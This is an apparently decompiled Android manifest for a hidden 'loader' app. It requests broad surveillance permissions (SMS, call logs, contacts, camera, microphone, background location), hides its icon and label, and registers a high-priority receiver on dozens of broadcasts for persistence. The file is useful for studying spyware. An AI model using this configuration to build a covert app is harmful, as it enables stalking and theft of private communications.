<?xml version="1.0" encoding="utf-8" standalone="no"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.example.leo.loader" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.microphone"/>
    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:icon="@mipmap/ic_launcher" android:label="　" android:requestLegacyExternalStorage="true" android:theme="@android:style/Theme.NoDisplay" android:usesCleartextTraffic="true">
        <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="com.example.leo.loader.BootBroadcastReceiver">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BATTERY_CHANGED"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.DATE_CHANGED"/>
                <action android:name="android.intent.action.DREAMING_STOPPED"/>
                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.SCREEN_OFF"/>
                <action android:name="android.intent.action.SCREEN_ON"/>
                <action android:name="android.intent.action.SERVICE_STATE"/>
                <action android:name="android.intent.action.SETTINGS"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.TIME_SET"/>
                <action android:name="android.intent.action.TIME_TICK"/>
                <action android:name="android.intent.action.UMS_CONNECTED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
                <action android:name="android.intent.action.WALLPAPER_CHANGED"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.net.wifi.STATE_CHANGE"/>
                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
                <action android:name="android.server.checkin.FOTA_CANCEL"/>
                <category android:name="android.intent.category.HOME"/>
            </intent-filter>
        </receiver>
        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.example.leo.loader.KeepScreenActivity" android:noHistory="true" android:taskAffinity="taskAffinity.KeepScreenActivity"/>
        <service android:foregroundServiceType="location" android:name="com.example.leo.loader.service.ForegroundService" android:permission="android.permission.BIND_JOB_SERVICE"/>
        <service android:foregroundServiceType="location" android:name="com.example.leo.loader.service.ForegroundService$InnerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
    </application>
</manifest>
